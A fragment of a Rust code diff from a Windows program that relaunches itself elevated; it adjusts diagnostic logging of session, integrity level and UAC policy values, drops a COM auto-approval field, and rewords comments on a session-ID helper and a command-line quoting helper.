+            "payload: {} build={} session={} elev_type={} integrity=0x{:x} enable_lua={} consent={}",
             message,
             crate::BUILD_DATE,
             current_session_id(),
@@ -624,17 +493,13 @@ pub fn append_elevation_diag(message: &str) {
             integrity_level(),
             uac_policy_value("EnableLUA"),
             uac_policy_value("ConsentPromptBehaviorAdmin"),
-            match com_auto_approved() {
-                Some(true) => "yes",
-                Some(false) => "no",
-                None => "unknown",
-            },
         );
     }
 }
 
-/// Session the process runs in, `u32::MAX` when unreadable. Recorded because a session
-/// without an interactive desktop cannot host the elevated COM server.
+/// Session the process runs in, `u32::MAX` when unreadable. Recorded because the
+/// elevated copy inherits it, and a session without an interactive desktop cannot host
+/// the screen capture this build exists for.
 fn current_session_id() -> u32 {
     let mut session = 0u32;
     let ok = unsafe { ProcessIdToSessionId(std::process::id(), &mut session) };
@@ -747,8 +612,8 @@ fn wide(value: &std::ffi::OsStr) -> Vec<u16> {
     value.encode_wide().chain(std::iter::once(0u16)).collect()
 }
 
-/// Quotes one argument for a Windows command line, following the `CommandLineToArgvW` rules
-/// the relaunched copy is parsed with.
+/// Quotes one argument for a Windows command line, following the `CommandLineToArgvW`
+/// rules the relaunched copy is parsed with.
 fn quote_arg(arg: &str) -> String {
     if !arg.is_empty() && !arg.chars().any(|ch| ch == ' ' || ch == '\t' || ch == '"') {
         return arg.to_owned();
